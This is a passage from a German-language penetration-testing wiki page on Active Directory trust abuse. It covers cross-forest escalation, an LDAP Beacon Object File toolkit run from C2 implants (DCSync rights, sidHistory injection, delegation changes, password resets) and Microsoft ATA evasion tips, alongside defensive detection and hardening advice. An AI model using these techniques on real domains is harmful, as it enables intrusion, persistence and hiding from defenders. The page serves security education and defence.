Ausführliche Informationen finden sich in der Forschung zu [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Beliebige gMSA im Forest kompromittieren**

Ein Angriffsvektor besteht darin, privilegierte gMSAs innerhalb der Domain anzugreifen. Der KDS Root Key, der für die Berechnung der Passwörter von gMSAs erforderlich ist, wird im Configuration NC gespeichert. Mit SYSTEM-Rechten auf einem beliebigen DC kann auf den KDS Root Key zugegriffen und können die Passwörter beliebiger gMSAs im gesamten Forest berechnet werden.

Eine ausführliche Analyse und schrittweise Anleitung finden sich unter:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ergänzender Angriff auf delegierte MSA (BadSuccessor – Ausnutzung von Migrationsattributen):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Zusätzliche externe Forschung: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema-Änderungsangriff**

Diese Methode erfordert Geduld, da auf die Erstellung neuer privilegierter AD-Objekte gewartet werden muss. Mit SYSTEM-Rechten kann ein Angreifer das AD Schema ändern, um einem beliebigen Benutzer vollständige Kontrolle über alle Klassen zu gewähren. Dies kann zu unbefugtem Zugriff auf neu erstellte AD-Objekte und deren Kontrolle führen.

Weitere Informationen finden sich unter [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Von DA zu EA mit ADCS ESC5**

Die ADCS-ESC5-Schwachstelle zielt auf die Kontrolle über Public-Key-Infrastructure-(PKI-)Objekte ab, um ein Certificate Template zu erstellen, das die Authentifizierung als beliebiger Benutzer innerhalb des Forests ermöglicht. Da sich PKI-Objekte im Configuration NC befinden, ermöglicht die Kompromittierung eines beschreibbaren Child DC die Durchführung von ESC5-Angriffen.

Weitere Details dazu finden sich unter [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Wenn kein ADCS vorhanden ist, kann der Angreifer die erforderlichen Komponenten einrichten, wie unter [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) beschrieben.<sup>[[16]](#references)</sup>

### Externe Forest-Domain – One-Way (Inbound) oder bidirektional

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

In diesem Szenario **wird Ihrer Domäne von einer externen Domäne vertraut**, wodurch Sie **nicht näher bestimmte Berechtigungen** über diese erhalten. Sie müssen herausfinden, **welche Principals Ihrer Domäne über welche Zugriffsrechte auf die externe Domäne verfügen**, und anschließend versuchen, diese auszunutzen:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Externe Forest-Domäne – Einseitig (ausgehend)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

In diesem Szenario **vertraut deine Domäne** einem Prinzipal aus **anderen Domänen** bestimmte **Berechtigungen** an.

Wenn jedoch eine **Domäne von der vertrauenden Domäne als vertrauenswürdig eingestuft wird**, erstellt die vertrauenswürdige Domäne **einen Benutzer** mit einem **vorhersehbaren Namen**, dessen **Passwort das Trust-Passwort** ist. Das bedeutet, dass es möglich ist, **auf einen Benutzer in der vertrauenden Domäne zuzugreifen, um in die vertrauenswürdige Domäne einzudringen**, sie zu enumerieren und zu versuchen, weitere Berechtigungen zu erlangen:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Eine weitere Möglichkeit, die vertrauenswürdige Domäne zu kompromittieren, besteht darin, einen [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) zu finden, der in der **entgegengesetzten Richtung** des Domänenvertrauens erstellt wurde (was nicht sehr häufig vorkommt).

Eine weitere Möglichkeit, die vertrauenswürdige Domäne zu kompromittieren, besteht darin, auf einem Computer zu warten, auf dem sich ein **Benutzer aus der vertrauenswürdigen Domäne anmelden kann**, um sich über **RDP** anzumelden. Der Angreifer könnte dann Code in den RDP-Sitzungsprozess einschleusen und von dort aus **auf die Ursprungsdomäne des Opfers zugreifen**.\
Wenn das **Opfer außerdem seine Festplatte eingebunden hat**, könnte der Angreifer über den **RDP-Sitzungsprozess** **Backdoors** im **Autostartordner der Festplatte** ablegen. Diese Technik wird **RDPInception** genannt.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Maßnahmen zur Eindämmung des Missbrauchs von Domänenvertrauensstellungen

### **SID Filtering:**

- Das Risiko von Angriffen, die das SID-History-Attribut über Forest Trusts hinweg ausnutzen, wird durch SID Filtering verringert, das standardmäßig für alle Vertrauensstellungen zwischen Forests aktiviert ist. Grundlage dafür ist die Annahme, dass Vertrauensstellungen innerhalb eines Forests sicher sind. Dabei gilt gemäß der Haltung von Microsoft nicht die Domäne, sondern der Forest als Sicherheitsgrenze.
- Allerdings gibt es einen Haken: SID Filtering kann Anwendungen und den Benutzerzugriff beeinträchtigen, weshalb es gelegentlich deaktiviert wird.

### **Selective Authentication:**

- Bei Vertrauensstellungen zwischen Forests stellt Selective Authentication sicher, dass Benutzer aus den beiden Forests nicht automatisch authentifiziert werden. Stattdessen benötigen Benutzer explizite Berechtigungen, um auf Domänen und Server innerhalb der vertrauenden Domäne oder des vertrauenden Forests zuzugreifen.
- Wichtig ist, dass diese Maßnahmen nicht vor der Ausnutzung des beschreibbaren Configuration Naming Context (NC) oder vor Angriffen auf das Trust-Konto schützen.

[**Weitere Informationen zu Domänenvertrauensstellungen auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-basierter AD-Missbrauch durch On-Host Implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementiert bloodyAD-artige LDAP-Primitives erneut als x64 Beacon Object Files, die vollständig innerhalb eines On-Host Implants (z. B. Adaptix C2) ausgeführt werden. Operatoren kompilieren das Pack mit `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laden `ldap.axs` und rufen dann über den Beacon `ldap <subcommand>` auf. Der gesamte Datenverkehr läuft über den aktuellen Logon-Sicherheitskontext via LDAP (389) mit Signing/Sealing oder LDAPS (636) mit automatischer Zertifikatsvertrauensstellung, sodass keine Socks-Proxys oder Artefakte auf der Festplatte erforderlich sind.<sup>[[4]](#references)</sup>

### LDAP-Enumeration auf Implant-Seite

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` und `get-groupmembers` wandeln Kurznamen/OU-Pfade in vollständige DNs um und geben die entsprechenden Objekte aus.
- `get-object`, `get-attribute` und `get-domaininfo` rufen beliebige Attribute (einschließlich Sicherheitsdeskriptoren) sowie Forest-/Domänenmetadaten aus `rootDSE` ab.
- `get-uac`, `get-spn`, `get-delegation` und `get-rbcd` zeigen Roasting-Kandidaten, Delegierungseinstellungen und vorhandene Deskriptoren für [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) direkt aus LDAP an.
- `get-acl` und `get-writable --detailed` analysieren die DACL, um Trustees, Rechte (GenericAll/WriteDACL/WriteOwner/Attribut-Schreibrechte) und Vererbung aufzulisten und so unmittelbare Ziele für eine ACL-Berechtigungserweiterung zu liefern.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### LDAP-Schreibprimitive für Privilegienausweitung & Persistenz

- BOFs zur Objekterstellung (`add-user`, `add-computer`, `add-group`, `add-ou`) ermöglichen es dem Operator, neue Principals oder Computerkonten überall dort anzulegen, wo OU-Berechtigungen bestehen. `add-groupmember`, `set-password`, `add-attribute` und `set-attribute` hijacken Ziele direkt, sobald Schreibrechte für Eigenschaften gefunden wurden.
- ACL-orientierte Befehle wie `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` und `add-dcsync` wandeln WriteDACL/WriteOwner für beliebige AD-Objekte in Passwort-Resets, Kontrolle über Gruppenmitgliedschaften oder DCSync-Replikationsrechte um, ohne PowerShell-/ADSI-Artefakte zu hinterlassen. Die entsprechenden `remove-*`-Befehle bereinigen injizierte ACEs.

### Delegation, Roasting und Kerberos-Missbrauch

- `add-spn`/`set-spn` machen einen kompromittierten Benutzer sofort Kerberoastable; `add-asreproastable` (UAC-Umschaltung) markiert ihn für AS-REP roasting, ohne das Passwort anzufassen.
- Delegationsmakros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) schreiben `msDS-AllowedToDelegateTo`, UAC-Flags oder `msDS-AllowedToActOnBehalfOfOtherIdentity` direkt über den Beacon um. Dadurch werden Angriffswege über constrained/unconstrained Delegation und RBCD ermöglicht, ohne Remote PowerShell oder RSAT.

### sidHistory-Injection, OU-Verschiebung und Gestaltung der Angriffsfläche

- `add-sidhistory` injiziert privilegierte SIDs in den SID-Verlauf eines kontrollierten Principals (siehe [SID-History-Injection](sid-history-injection.md)) und ermöglicht so die unauffällige Vererbung von Zugriff vollständig über LDAP/LDAPS.
- `move-object` ändert den DN/die OU von Computern oder Benutzern. Dadurch kann ein Angreifer Assets in OUs verschieben, in denen bereits delegierte Rechte bestehen, bevor er `set-password`, `add-groupmember` oder `add-spn` missbraucht.
- Eng eingegrenzte Entfernungsbefehle (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` usw.) ermöglichen ein schnelles Rollback, nachdem der Operator Zugangsdaten oder Persistenz erlangt hat, und minimieren so die Telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Allgemeine Abwehrmaßnahmen

[**Hier erfahren Sie mehr darüber, wie Sie Zugangsdaten schützen.**](../stealing-credentials/credentials-protections.md)

### **Schutzmaßnahmen für Zugangsdaten**

- **Einschränkungen für Domain Admins**: Es wird empfohlen, Domain Admins die Anmeldung nur an Domain Controllern zu erlauben und sie nicht auf anderen Hosts zu verwenden.
- **Berechtigungen von Servicekonten**: Dienste sollten aus Sicherheitsgründen nicht mit Domain-Admin-Berechtigungen (DA) ausgeführt werden.
- **Zeitliche Begrenzung von Berechtigungen**: Bei Aufgaben, die DA-Berechtigungen erfordern, sollte deren Dauer begrenzt werden. Dies lässt sich erreichen mit: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Abwehr von LDAP relay**: Überwachen Sie die Event-IDs 2889/3074/3075 und erzwingen Sie anschließend LDAP signing sowie LDAPS channel binding auf DCs/Clients, um LDAP-MITM-/relay-Versuche zu blockieren.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protokollbasierte Erkennung von Impacket-Aktivitäten

Wenn Sie gängige AD-Techniken erkennen möchten, **verlassen Sie sich nicht ausschließlich auf vom Operator kontrollierte Artefakte** wie umbenannte Binärdateien, Dienstnamen, temporäre Batch-Dateien oder Ausgabepfade. Erstellen Sie eine Baseline dafür, wie legitime Windows-Clients [Kerberos](kerberos-authentication.md)-, [NTLM](../ntlm/README.md)-, SMB-, LDAP-, DCE/RPC- und WMI-Datenverkehr erzeugen, und suchen Sie dann nach **Implementierungsbesonderheiten**, die auch dann bestehen bleiben, wenn der Operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` oder `ntlmrelayx.py` bearbeitet.<sup>[[8]](#references)</sup>

- **Kandidaten mit hoher Zuverlässigkeit für eigenständige Erkennung** (nach Abgleich mit Ihrer eigenen Baseline):
  - Authentifiziertes DCE/RPC mit `auth_context_id = 79231 + ctx_id`
  - Mit `0xff` gefülltes DCE/RPC-Authentifizierungs-Padding
  - LDAP-Kerberos-Binds, die ein rohes Kerberos-`AP-REQ` direkt im SPNEGO-`mechToken` platzieren
  - SMB2/3-Negotiate-Anfragen mit wie ASCII aussehenden `ClientGuid`-Werten
  - WMI-`IWbemLevel1Login::NTLMLogin` mit dem nicht standardmäßigen Namespace `//./root/cimv2`
  - Hardcodierte Kerberos-Nonce-Werte
- **Besser als Korrelations-/Scoring-Merkmale geeignet**:
  - Spärliche oder doppelte Kerberos-etype-Listen, ungewöhnliche/fehlende `PA-DATA` oder eine von nativem Windows abweichende Etype-Reihenfolge in TGS-REQ
  - NTLM-Type-1-Nachrichten ohne Versionsinformationen oder Type-3-Nachrichten mit null Hostnamen
  - Rohes NTLMSSP in DCE/RPC statt SPNEGO, fehlende DCE/RPC-Verifizierungstrailer oder nicht übereinstimmende SPNEGO-/Kerberos-OIDs
  - Mehrere dieser Merkmale desselben Hosts/Benutzers derselben Sitzung/desselben Zeitfensters sind deutlich aussagekräftiger als ein einzelnes schwaches Feld
- **Als Anreicherung statt als eigenständige Alerts verwenden**:
  - Standarddateinamen, Ausgabepfade, zufällige Dienstnamen, temporäre Batch-Namen, Standardnamen von Computerkonten und toolspezifische HTTP-/WebDAV-/RDP-/MSSQL-Zeichenfolgen
  - Diese lassen sich vom Operator leicht ändern und eignen sich am besten dazu, zu erklären, warum ein protokollübergreifender Cluster verdächtig ist
- **Betriebshinweise**:
  - Einige dieser Signale erfordern entschlüsselten Datenverkehr, [PCAP-/Zeek-Parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW oder Einblick auf der Dienstseite
  - Prüfen Sie die Signale anhand von Samba-/Linux-Clients, Appliances und älterer Software, bevor Sie sie zu Alerts hochstufen
  - Entwickeln Sie Erkennungen schrittweise von Anreicherung -> Hunting -> Alerting weiter, sobald Sie mehr Vertrauen in die Baseline gewinnen

### **Implementierung von Deception-Techniken**

- Bei Deception werden Fallen eingerichtet, etwa Decoy-Benutzer oder -Computer mit Merkmalen wie Passwörtern, die nie ablaufen, oder der Markierung als Trusted for Delegation. Ein ausführlicher Ansatz umfasst das Erstellen von Benutzern mit bestimmten Rechten oder das Hinzufügen zu Gruppen mit hohen Berechtigungen.<sup>[[2]](#references)</sup>
- Ein praktisches Beispiel ist die Verwendung von Tools wie: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Weitere Informationen zur Bereitstellung von Deception-Techniken finden Sie unter [Deploy-Deception auf GitHub](https://github.com/samratashok/Deploy-Deception).

### **Erkennen von Deception**

- **Bei Benutzerobjekten**: Verdächtige Indikatoren sind ein atypischer ObjectSID, seltene Anmeldungen, ungewöhnliche Erstellungsdaten und eine geringe Anzahl fehlgeschlagener Kennworteingaben.
- **Allgemeine Indikatoren**: Der Vergleich von Attributen potenzieller Decoy-Objekte mit denen echter Objekte kann Inkonsistenzen aufdecken. Tools wie [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) können dabei helfen, solche Täuschungen zu erkennen.

### **Umgehen von Detection-Systemen**

- **Umgehung der Microsoft-ATA-Erkennung**:
  - **Benutzeraufzählung**: Sitzungsaufzählung auf Domain Controllern vermeiden, um eine Erkennung durch ATA zu verhindern.
  - **Ticket-Impersonation**: Die Verwendung von **aes**-Schlüsseln zur Ticket-Erstellung hilft, der Erkennung zu entgehen, da kein Downgrade auf NTLM erfolgt.
  - **DCSync-Angriffe**: Es wird empfohlen, diese von einem Nicht-Domain-Controller auszuführen, um eine Erkennung durch ATA zu vermeiden, da die direkte Ausführung auf einem Domain Controller Alerts auslöst.

## References

- [1] [Ein Leitfaden zum Angriff auf Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Trusts zur Täuschung in Active Directory fälschen](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Vom Domain Admin zum Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP-BOF-Sammlung – In-Memory-LDAP-Toolkit für die Ausnutzung von Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM-Hashes als Wordlist einsetzen](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket analysieren](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon – Onelogon: Übernahme von Active-Directory-Konten über Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft – Änderungen an Netlogon-Secure-Channel-Verbindungen im Zusammenhang mit CVE-2020-1472 verwalten](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Eine Reise zu vergessenen Null-Session- und MS-RPC-Schnittstellen](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID-Filter als Sicherheitsgrenze zwischen Domains? (Teil 4) – Forschung zur Umgehung von SID-Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID-Filter als Sicherheitsgrenze zwischen Domains? (Teil 5) – Golden-GMSA-Trust-Angriff – vom Child zur Parent-Domain](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID-Filter als Sicherheitsgrenze zwischen Domains? (Teil 6) – Schema-Change-Trust-Angriff – vom Child zur Parent-Domain](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Von DA zu EA mit ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [In 5 Minuten von den Admins einer Child-Domain zu Enterprise Admins aufsteigen, indem AD CS missbraucht wird – eine Fortsetzung](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Ein ACE im Ärmel: Backdoors für Active-Directory-DACLs entwickeln](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Quellcode des NetExec-pre2k-Moduls](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema – msDS-GroupMSAMembership-Attribut](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf – HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
